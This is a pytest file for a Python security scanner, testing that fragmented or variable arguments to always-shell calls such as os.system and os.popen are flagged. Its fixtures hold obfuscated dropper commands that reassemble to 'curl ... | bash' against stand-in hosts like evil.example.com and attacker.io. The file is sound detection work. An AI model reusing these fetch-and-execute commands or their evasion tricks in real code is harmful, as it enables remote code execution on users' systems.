#!/usr/bin/env python3
"""Security-audit red-team group A (py-context) — always-shell variable-arg FN-holes.

Closes three CRITICAL/HIGH false-negative holes in
``scripts/_skillaudit_python_context.py::_classify_call`` where ALWAYS-shell
string sinks (``os.system`` / ``os.popen`` / ``subprocess.getoutput`` /
``subprocess.getstatusoutput`` / ``commands.getoutput`` /
``commands.getstatusoutput`` / ``pty.spawn`` /
``asyncio.create_subprocess_shell``) were granted the "shell= absent → Python
passes argv to execve, no shell" leniency that only applies to argv-form sinks
(``subprocess.run([...])`` / ``os.execv(...)``). These always-shell sinks route
their argument string through ``/bin/sh -c`` UNCONDITIONALLY, so a
non-pure-literal arg (a bare ``Name`` reassembled on a prior line, a string
``BinOp`` of ``Name`` operands, a ``Call`` returning the built string, a
``Subscript``/``Attribute``) is a live shell execution and must stay visible.

Findings:
  * RT2-rawstring-reassembly-always-shell-var-arg (CRITICAL) — reassembled
    VARIABLE arg fed to an always-shell sink cleared as safe_literal.
  * RT4-ossystem-name-safe-literal (CRITICAL) — ``os.system(<Name>)`` /
    ``os.popen(<Name>)`` cleared while ``subprocess.run(<Name>, shell=True)``
    correctly stays suspect (asymmetry).
  * RT4-strconcat-bypass (HIGH) — ``os.system(a + b + c)`` all-``Name`` concat
    dropper reassembling to ``curl … | bash`` cleared as safe_literal.

Each test is TWO-SIDED: it asserts (1) the malicious shape now FIRES (verdict
``suspect`` → SHELL_EXEC/CMD_INJECTION kept at declared severity), AND (2) the
benign case the original leniency exists to suppress STILL clears (verdict
``safe_literal``) — proving the fix is additive (FN-safe), never a blanket
escalation. The asymmetric ``subprocess.run(<Name>, shell=True)`` sibling and
the argv-form ``subprocess.run([...])`` benign baseline are included as the
controlled poles.

GOVERNING CONTRACT (never-suppress): the ONLY admissible auto-clear for an
always-shell sink is a PURE-literal arg (``os.system("clear")``). Whether the
reassembly sits inline at the sink or one line up in a variable is an
attacker-controllable structural signal and must NOT determine the verdict.
"""

from __future__ import annotations

import sys
from pathlib import Path

REPO = Path(__file__).parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))


def _idx(src: str, needle: str) -> int:
    """Return the 0-based line index where ``needle`` first appears.

    ``classify`` takes a 0-based ``line_idx`` and converts to the AST's
    1-based line numbers internally (mirrors the convention in
    ``test_skillaudit_python_context.py``).
    """
    offset = src.index(needle)
    return src.count("\n", 0, offset)


# ────────────────────────────────────────────────────────────────────────
# Set-shape invariants — the always-shell subset must be exactly the 8 sinks
# that have no non-shell mode, must all live inside _SHELL_CALL_FQNAMES (so the
# new branch is reachable), and must have ZERO overlap with the argv-form sinks
# (which truly bypass the shell and must keep the execve leniency).
# ────────────────────────────────────────────────────────────────────────


class TestAlwaysShellSetInvariants:
    def test_always_shell_set_is_exactly_the_eight_sinks(self) -> None:
        """_ALWAYS_SHELL_STRING_SINKS resolves to exactly the 8 always-shell string sinks."""
        import _skillaudit_python_context as ctx

        assert ctx._ALWAYS_SHELL_STRING_SINKS == frozenset(
            {
                "os.system",
                "os.popen",
                "commands.getoutput",
                "commands.getstatusoutput",
                "pty.spawn",
                "asyncio.create_subprocess_shell",
                "subprocess.getoutput",
                "subprocess.getstatusoutput",
            }
        )

    def test_always_shell_set_is_subset_of_shell_call_fqnames(self) -> None:
        """Every always-shell sink is in _SHELL_CALL_FQNAMES so the new branch is reachable."""
        import _skillaudit_python_context as ctx

        assert ctx._ALWAYS_SHELL_STRING_SINKS <= ctx._SHELL_CALL_FQNAMES

    def test_always_shell_set_excludes_argv_form_sinks(self) -> None:
        """The always-shell set never includes argv-form sinks that truly bypass the shell."""
        import _skillaudit_python_context as ctx

        argv_form = frozenset(
            {
                "subprocess.run",
                "subprocess.Popen",
                "subprocess.call",
                "subprocess.check_call",
                "subprocess.check_output",
                "os.execv",
                "os.execve",
                "os.execvp",
                "os.execvpe",
                "os.spawnv",
                "os.spawnve",
                "asyncio.create_subprocess_exec",
            }
        )
        assert not (ctx._ALWAYS_SHELL_STRING_SINKS & argv_form)

    def test_always_shell_set_excludes_dynamic_exec(self) -> None:
        """eval/exec/compile/__import__ are handled separately, never in the always-shell set."""
        import _skillaudit_python_context as ctx

        assert not (ctx._ALWAYS_SHELL_STRING_SINKS & ctx._DYNAMIC_EXEC_FQNAMES)


# ────────────────────────────────────────────────────────────────────────
# RT2-rawstring-reassembly-always-shell-var-arg (CRITICAL)
# A reassembled VARIABLE / Call arg fed to an always-shell sink must be suspect;
# a pure-literal arg to the same sink must still clear.
# ────────────────────────────────────────────────────────────────────────


class TestRT2RawstringReassemblyAlwaysShellVarArg:
    def test_malicious_os_system_reassembled_variable_fires(self) -> None:
        """os.system(<reassembled Name>) is a live shell exec → suspect (fires).

        Fixture B from the report: re.compile fragments joined into a VARIABLE
        on a prior line, then os.system(cmd). The reassembly is one line up, so
        _arg_is_exploit_shape sees only a bare Name at the sink — yet the sink
        runs it through /bin/sh -c, so it must stay visible.
        """
        import _skillaudit_python_context as ctx

        src = (
            "import os, re\n"
            'FRAGS = [re.compile(r"curl "), re.compile(r"http://evil.example.com/x.sh"), re.compile(r" | sh")]\n'
            "def run():\n"
            '    cmd = "".join(f.pattern for f in FRAGS)\n'
            "    os.system(cmd)\n"
        )
        verdict = ctx.classify("scripts/dropper.py", src, _idx(src, "os.system(cmd)"), "os.system", "SHELL_EXEC")
        assert verdict == "suspect"

    def test_malicious_os_popen_reassembled_variable_fires(self) -> None:
        """os.popen(<reassembled Name>) → suspect (fixture F sink, always-shell)."""
        import _skillaudit_python_context as ctx

        src = "import os\ndef run():\n    cmd = build_payload()\n    os.popen(cmd)\n"
        verdict = ctx.classify("scripts/dropper.py", src, _idx(src, "os.popen(cmd)"), "os.popen", "SHELL_EXEC")
        assert verdict == "suspect"

    def test_malicious_subprocess_getoutput_reassembled_variable_fires(self) -> None:
        """subprocess.getoutput(<reassembled Name>) → suspect (fixture F sink)."""
        import _skillaudit_python_context as ctx

        src = "import subprocess\ndef run():\n    cmd = build_payload()\n    subprocess.getoutput(cmd)\n"
        verdict = ctx.classify(
            "scripts/dropper.py", src, _idx(src, "subprocess.getoutput(cmd)"), "subprocess.getoutput", "SHELL_EXEC"
        )
        assert verdict == "suspect"

    def test_malicious_os_system_function_built_call_fires(self) -> None:
        """os.system(build()) — Call returning the reassembled string → suspect (fixture E)."""
        import _skillaudit_python_context as ctx

        src = (
            "import os\n"
            'P0=r"cur"; P1=r"l htt"; P2=r"p://evil.example.com/x."; P3=r"sh "; P4=r"| ba"; P5=r"sh"\n'
            "def build(): return P0+P1+P2+P3+P4+P5\n"
            "def run(): os.system(build())\n"
        )
        verdict = ctx.classify("scripts/dropper.py", src, _idx(src, "os.system(build())"), "os.system", "SHELL_EXEC")
        assert verdict == "suspect"

    def test_benign_os_system_pure_literal_still_clears(self) -> None:
        """os.system("clear") — pure literal, the ONLY provably-inert always-shell case → safe_literal.

        This is the benign baseline the leniency exists to suppress; it must
        survive the fix unchanged (FN-safe / additive).
        """
        import _skillaudit_python_context as ctx

        src = 'import os\nos.system("clear")\n'
        verdict = ctx.classify("scripts/x.py", src, _idx(src, "clear"), "clear", "SHELL_EXEC")
        assert verdict == "safe_literal"

    def test_benign_subprocess_getoutput_pure_literal_still_clears(self) -> None:
        """subprocess.getoutput("git status") — pure literal → safe_literal (no regression)."""
        import _skillaudit_python_context as ctx

        src = 'import subprocess\nsubprocess.getoutput("git status")\n'
        verdict = ctx.classify(
            "scripts/x.py", src, _idx(src, "git status"), "git status", "SHELL_EXEC"
        )
        assert verdict == "safe_literal"


# ────────────────────────────────────────────────────────────────────────
# RT4-ossystem-name-safe-literal (CRITICAL)
# os.system(<Name>) / os.popen(<Name>) must reach parity with the already-correct
# subprocess.run(<Name>, shell=True) → suspect; the argv-form benign baseline and
# the pure-literal benign case must still clear.
# ────────────────────────────────────────────────────────────────────────


class TestRT4OsSystemNameSafeLiteral:
    def test_malicious_os_system_bare_name_fires(self) -> None:
        """os.system(<bare Name>) reconstructed payload → suspect (was safe_literal)."""
        import _skillaudit_python_context as ctx

        src = "import os\ncmd = reconstruct_from_charcodes()\nos.system(cmd)\n"
        verdict = ctx.classify("scripts/dropper.py", src, _idx(src, "os.system(cmd)"), "os.system", "CMD_INJECTION")
        assert verdict == "suspect"

    def test_malicious_os_popen_bare_name_fires(self) -> None:
        """os.popen(<bare Name>) reconstructed payload → suspect (was safe_literal)."""
        import _skillaudit_python_context as ctx

        src = "import os\ncmd = reconstruct_from_charcodes()\nos.popen(cmd)\n"
        verdict = ctx.classify("scripts/dropper.py", src, _idx(src, "os.popen(cmd)"), "os.popen", "SHELL_EXEC")
        assert verdict == "suspect"

    def test_asymmetry_subprocess_run_name_shell_true_already_fires(self) -> None:
        """The asymmetric control: subprocess.run(<Name>, shell=True) already fires → suspect.

        This is the already-correct path the always-shell sinks are brought to
        parity with. It is unaffected by the fix (goes through the existing
        _shell_kwarg_is_possibly_true branch) — proving the gap was SPECIFIC to
        the always-shell-string leniency, not a general inability to see a
        reconstructed Name.
        """
        import _skillaudit_python_context as ctx

        src = "import subprocess\ncmd = reconstruct_from_charcodes()\nsubprocess.run(cmd, shell=True)\n"
        verdict = ctx.classify(
            "scripts/dropper.py", src, _idx(src, "subprocess.run(cmd"), "subprocess.run", "SHELL_EXEC"
        )
        assert verdict == "suspect"

    def test_benign_argv_form_subprocess_run_list_still_clears(self) -> None:
        """subprocess.run([cmd, arg], shell=False) — argv form, NOT always-shell → safe_literal.

        The argv-form sink truly bypasses /bin/sh -c (each element is one argv,
        no metachar interpretation), so it keeps the execve leniency. The fix
        must NOT touch this case (it is the FP the leniency exists for).
        """
        import _skillaudit_python_context as ctx

        src = 'import subprocess\ncmd = "git"\narg = "log"\nsubprocess.run([cmd, arg], shell=False)\n'
        verdict = ctx.classify(
            "scripts/x.py", src, _idx(src, "[cmd, arg]"), "subprocess.run", "CMD_INJECTION"
        )
        assert verdict == "safe_literal"

    def test_benign_os_system_literal_still_clears(self) -> None:
        """os.system("git status") — pure literal → safe_literal (parity-control benign pole)."""
        import _skillaudit_python_context as ctx

        src = 'import os\nos.system("git status")\n'
        verdict = ctx.classify("scripts/x.py", src, _idx(src, "git status"), "git status", "CMD_INJECTION")
        assert verdict == "safe_literal"


# ────────────────────────────────────────────────────────────────────────
# RT4-strconcat-bypass (HIGH)
# os.system(a + b + c) where a/b/c are reassembled fragments must be suspect;
# the canonical literal+variable concat sibling must still fire (already did);
# const+const and all-Name concat into an always-shell sink are both now caught.
# ────────────────────────────────────────────────────────────────────────


class TestRT4StrConcatBypass:
    def test_malicious_os_system_all_name_concat_fires(self) -> None:
        """os.system(a + b + c) all-Name BinOp reassembling to curl|bash → suspect (was safe_literal).

        The exact dropper from the report: fragments in plain variables,
        concatenated at the sink. _arg_is_exploit_shape flags only mixed
        literal+Name concat, so an all-Name concat slipped through — but the
        always-shell sink runs the result through /bin/sh -c.
        """
        import _skillaudit_python_context as ctx

        src = (
            "import os\n"
            "def fetch_and_run():\n"
            "    a = 'cur' + 'l https'\n"
            "    b = '://attac' + 'ker.io/x'\n"
            "    c = '.sh | ba' + 'sh'\n"
            "    os.system(a + b + c)\n"
        )
        verdict = ctx.classify(
            "scripts/util.py", src, _idx(src, "os.system(a + b + c)"), "os.system", "CMD_INJECTION"
        )
        assert verdict == "suspect"

    def test_malicious_os_system_all_literal_concat_fires(self) -> None:
        """os.system("cur" + "l x | sh") all-literal BinOp → suspect.

        A const+const concat is not a single pure-literal Constant, so the
        always-shell sink cannot prove it inert (and the reassembled string is a
        live shell command). It must stay visible — RC-136/SUPPLY_CHAIN textual
        rules may not always reconstruct fragmented literals, so the AST sink
        verdict is the backstop.
        """
        import _skillaudit_python_context as ctx

        src = 'import os\nos.system("cur" + "l http://x.io/p | sh")\n'
        verdict = ctx.classify(
            "scripts/util.py", src, _idx(src, "os.system("), "os.system", "CMD_INJECTION"
        )
        assert verdict == "suspect"

    def test_canonical_literal_plus_variable_concat_still_fires(self) -> None:
        """os.system("curl " + url) — the canonical injection form → suspect (already fired, still does).

        This is the classic literal-prefix + variable shape _arg_is_exploit_shape
        always caught. The fix keeps it firing (now via the always-shell branch
        rather than the exploit-shape fall-through) — no regression in coverage.
        """
        import _skillaudit_python_context as ctx

        src = 'import os\nurl = get_url()\nos.system("curl " + url + " | bash")\n'
        verdict = ctx.classify(
            "scripts/util.py", src, _idx(src, "os.system("), "os.system", "CMD_INJECTION"
        )
        assert verdict == "suspect"

    def test_benign_pure_literal_single_string_still_clears(self) -> None:
        """os.system("ls -la") — a single pure literal (no concat) → safe_literal (benign pole).

        The two-sided lower bound for the concat finding: a genuinely inert
        single-literal always-shell call must still clear, so the fix only adds
        findings for NON-pure-literal args.
        """
        import _skillaudit_python_context as ctx

        src = 'import os\nos.system("ls -la")\n'
        verdict = ctx.classify("scripts/x.py", src, _idx(src, "ls -la"), "ls -la", "CMD_INJECTION")
        assert verdict == "safe_literal"


# ────────────────────────────────────────────────────────────────────────
# END-TO-END pipeline (regex → context classifier → suppress/keep)
#
# The classifier verdict above is only consulted AFTER an execution-class
# SkillAudit regex matches the line. Enumerating the SHELL_EXEC / CMD_INJECTION
# regexes proved that ONLY ``os.system`` (and, incidentally, ``pty.spawn`` via
# the generic ``\bspawn\s*\(``) matched the BARE-CALL form — so the six other
# always-shell string sinks (``os.popen`` / ``subprocess.get[status]output`` /
# ``commands.get[status]output`` / ``asyncio.create_subprocess_shell``) never
# reached the classifier and the correct ``suspect`` verdict was DEAD CODE for
# them. A reassembled-variable arg shipped a working RCE that scanned clean:
# ``frags -> cmd -> os.popen(cmd)`` produced zero findings end-to-end.
#
# The fix adds ONE SHELL_EXEC pattern matching the bare CALL form of those six
# sinks so the line MATCHES and the existing classifier branch runs. These
# tests drive the REAL ``scan_content`` pipeline (regex match + ``_confidence``
# + ``_context_classifier_verdict``), NOT ``classify`` in isolation, so they
# would have FAILED before the regex change even though the classifier-level
# tests above already passed.
#
# Each test is TWO-SIDED: a reassembled / variable / concat argument must
# produce an UNSUPPRESSED SHELL_EXEC finding ON THE SINK LINE (the RCE is
# caught), while the pure-literal sibling (``os.popen('ls')`` /
# ``subprocess.getoutput('git status')``) must produce NONE (the classifier
# proves it inert → suppress). This is the FN-safety lower bound: the fix only
# adds findings for non-pure-literal args, never escalates a benign literal.
# ────────────────────────────────────────────────────────────────────────


import cpv_skillaudit_native as _NATIVE  # noqa: E402


def _visible_findings(findings: list[dict], rule_id: str) -> list[dict]:
    """SkillAudit findings for ``rule_id`` that are neither suppressed nor demoted.

    Mirrors the ``_visible`` helper in ``test_audit_fix_b03.py`` — a finding
    whose ``suppressed`` or ``demoted`` flag is set is NOT surfaced to the
    publish gate, so only the unflagged ones count as a real detection.
    """
    return [
        f
        for f in findings
        if f.get("ruleId") == rule_id and not f.get("suppressed") and not f.get("demoted")
    ]


# The six always-shell string sinks whose bare-call form matched NO
# execution-class regex before the fix (so the classifier was never consulted).
# ``os.system`` and ``pty.spawn`` are deliberately excluded — they were already
# reachable via the pre-existing ``\bos\.system\b`` / ``\bspawn\s*\(`` patterns,
# so they were never part of this FN-hole and need no new pattern.
_PREVIOUSLY_DEAD_SINKS: tuple[str, ...] = (
    "os.popen",
    "subprocess.getoutput",
    "subprocess.getstatusoutput",
    "commands.getoutput",
    "commands.getstatusoutput",
    "asyncio.create_subprocess_shell",
)


def _malicious_sink_source(sink: str) -> str:
    """A .py source where ``sink`` runs a payload reassembled from fragments.

    The payload is built on a PRIOR line into a bare ``Name`` (``cmd``) so no
    single string literal carries it — the textual SUPPLY_CHAIN / CMD_INJECTION
    rules cannot reconstruct it, leaving the AST sink classifier as the only
    backstop. ``asyncio.create_subprocess_shell`` is awaited inside an ``async``
    def so the source parses.
    """
    module = sink.split(".", 1)[0]
    if sink == "asyncio.create_subprocess_shell":
        return (
            "import asyncio\n"
            "async def run():\n"
            '    frags = ["cur", "l htt", "p://evil.example.com/x.", "sh ", "| ba", "sh"]\n'
            '    cmd = "".join(frags)\n'
            f"    return await {sink}(cmd)\n"
        )
    return (
        f"import {module}\n"
        "def run():\n"
        '    frags = ["cur", "l htt", "p://evil.example.com/x.", "sh ", "| ba", "sh"]\n'
        '    cmd = "".join(frags)\n'
        f"    return {sink}(cmd)\n"
    )


def _benign_sink_source(sink: str) -> str:
    """A .py source where ``sink`` is called with a single pure string literal.

    ``os.popen('ls')`` / ``subprocess.getoutput('git status')`` etc. — the ONLY
    provably-inert always-shell case. The classifier must return ``safe_literal``
    and the finding must be suppressed (not surfaced).
    """
    module = sink.split(".", 1)[0]
    if sink == "asyncio.create_subprocess_shell":
        return f"import asyncio\nasync def run():\n    return await {sink}('git status')\n"
    return f"import {module}\ndef run():\n    return {sink}('git status')\n"


class TestAlwaysShellSinksEndToEnd:
    """End-to-end: the bare-call form of every previously-dead sink now FIRES.

    These exercise ``cpv_skillaudit_native.scan_content`` — the full
    regex→classifier→suppress pipeline — so they prove the regex extension, not
    just the (already-correct) classifier branch.
    """

    def test_every_dead_sink_bare_call_is_reachable_by_a_regex(self) -> None:
        """Each previously-dead sink's bare-call form now matches a SHELL_EXEC/CMD_INJECTION regex.

        This is the root-cause assertion: before the fix these six lines matched
        NO execution-class pattern, so ``_context_classifier_verdict`` was never
        invoked for them. After the fix every one matches, so the classifier is
        consulted and can return ``suspect`` (keep) for a reassembled arg.
        """
        import json
        import re
        from pathlib import Path

        rules_path = Path(__file__).parent.parent / "scripts" / "rules" / "skillaudit_patterns.json"
        rules = {r["id"]: r for r in json.loads(rules_path.read_text())["rules"]}
        exec_patterns = rules["SHELL_EXEC"]["patterns"] + rules["CMD_INJECTION"]["patterns"]
        compiled = [re.compile(p) for p in exec_patterns]
        for sink in _PREVIOUSLY_DEAD_SINKS:
            line = f"{sink}(cmd)"
            assert any(rx.search(line) for rx in compiled), f"{sink} bare call is still unreachable by any execution-class regex"

    def test_malicious_reassembled_arg_fires_unsuppressed_on_sink_line(self) -> None:
        """A reassembled-variable arg to each dead sink → unsuppressed SHELL_EXEC on the sink line.

        End-to-end proof the RCE is no longer invisible: the finding is visible
        (not suppressed / not demoted), is the SHELL_EXEC rule, and lands on the
        exact line of the sink call (``return <sink>(cmd)``), not an incidental
        data-string match elsewhere.
        """
        for sink in _PREVIOUSLY_DEAD_SINKS:
            src = _malicious_sink_source(sink)
            findings = _NATIVE.scan_content(src, "skills/demo/helper.py")
            visible = _visible_findings(findings, "SHELL_EXEC")
            assert visible, f"{sink}: reassembled-arg RCE produced NO visible SHELL_EXEC finding (FN hole still open)"
            sink_line = next(i for i, ln in enumerate(src.split("\n"), start=1) if f"{sink}(cmd)" in ln)
            on_sink = [f for f in visible if f.get("line") == sink_line]
            assert on_sink, f"{sink}: SHELL_EXEC finding not on the sink line {sink_line} (got {[f.get('line') for f in visible]})"
            # The match must be the sink call itself, not a data string.
            assert any(sink in str(f.get("match", "")) for f in on_sink), (
                f"{sink}: SHELL_EXEC match is not the sink call ({[f.get('match') for f in on_sink]})"
            )

    def test_benign_pure_literal_arg_produces_no_visible_finding(self) -> None:
        """A pure-literal arg to each dead sink → NO visible SHELL_EXEC (classifier suppresses).

        FN-safety lower bound: ``os.popen('ls')`` / ``subprocess.getoutput('git
        status')`` are provably inert (the only safe always-shell case), so the
        regex still matches BUT the classifier returns ``safe_literal`` and the
        finding is suppressed. The fix adds findings only for non-pure-literal
        args — it must never escalate a benign literal.
        """
        for sink in _PREVIOUSLY_DEAD_SINKS:
            src = _benign_sink_source(sink)
            findings = _NATIVE.scan_content(src, "skills/demo/helper.py")
            visible = _visible_findings(findings, "SHELL_EXEC")
            assert not visible, (
                f"{sink}: benign pure-literal call produced a visible SHELL_EXEC finding "
                f"(false positive — should be suppressed as safe_literal): "
                f"{[(f.get('line'), f.get('match')) for f in visible]}"
            )

    def test_subprocess_getoutputs_identifier_is_not_a_false_positive(self) -> None:
        """A call to ``subprocess.getoutputs`` (no such sink) must NOT match the new pattern.

        The new pattern uses ``\\s*\\(`` immediately after the sink name, so a
        longer identifier sharing a prefix (``getoutput`` + ``s``) does not match
        — guarding against the identifier-prefix FP class the existing SHELL_EXEC
        ``\\b`` boundaries also guard against.
        """
        import json
        import re
        from pathlib import Path

        rules_path = Path(__file__).parent.parent / "scripts" / "rules" / "skillaudit_patterns.json"
        rules = {r["id"]: r for r in json.loads(rules_path.read_text())["rules"]}
        new_pattern = next(
            p for p in rules["SHELL_EXEC"]["patterns"] if "create_subprocess_shell" in p
        )
        rx = re.compile(new_pattern)
        assert rx.search("subprocess.getoutput(cmd)")  # the real sink matches
        assert not rx.search("subprocess.getoutputs(cmd)")  # the look-alike does not
        assert not rx.search("my_os.popener(cmd)")  # identifier-prefix look-alike does not
        # The argv-form async variant truly bypasses the shell and must NOT match.
        assert not rx.search("asyncio.create_subprocess_exec(*argv)")
